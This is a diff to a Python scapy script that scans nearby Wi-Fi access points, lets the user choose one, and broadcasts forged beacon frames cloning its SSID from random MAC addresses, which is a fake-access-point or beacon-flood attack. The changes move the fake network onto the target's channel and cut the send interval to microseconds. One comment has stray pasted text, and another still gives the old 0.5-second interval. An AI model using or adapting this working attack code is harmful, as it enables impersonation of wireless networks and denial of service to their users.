@@ -4,6 +4,12 @@ import pandas
 import time
 import os
 
+def get_freq(channel):
+	return 2412 + (channel-1)*5
+
+
+
+
 # Let user select network interface to perform attack
 while(True): # Emulating do while in python
 	ifaces = get_if_list() # Get interfaces in loop in case a new one appears
@@ -13,6 +19,9 @@ while(True): # Emulating do while in python
 		break
 
 # Source for sniffing part: https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
+
+
+#pandas.set_option("display.max_rows", 999)
 
 # initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -58,6 +67,7 @@ def change_channel(stop):
 		ch = ch % 14 + 1
 		time.sleep(0.5)
 
+
 		if stop():
 			break
 
@@ -88,15 +98,16 @@ else:
 	# Getting network infos
 	ssid, dbm_signal, ch, crypto = networks.loc[bssid]
 
+
 	# Creating new fake network six channel next to real one
-	ch = (ch + 6) % 14
+	#ch = (ch + 6) % 14
 	os.system(f"iwconfig {iface} channel {ch}") # 
 
-	# Build packet with scapy
-	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr3=RandMAC()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+	# Build packet with scapyget_freq(1)
+	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr3=RandMAC()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=(b"\x01"))
 	
 	print(f"\nCreating new network {ssid} on channel {ch}")
 	print("Press <ctrl + C> to stop attack")
-	sendp(p, inter=0.5, iface=iface, loop=1) # Send packet every 0.5 seconds forever
+	sendp(p, inter=0.000001, iface=iface, loop=1) # Send packet every 0.5 seconds forever
 
 print("Exiting...")
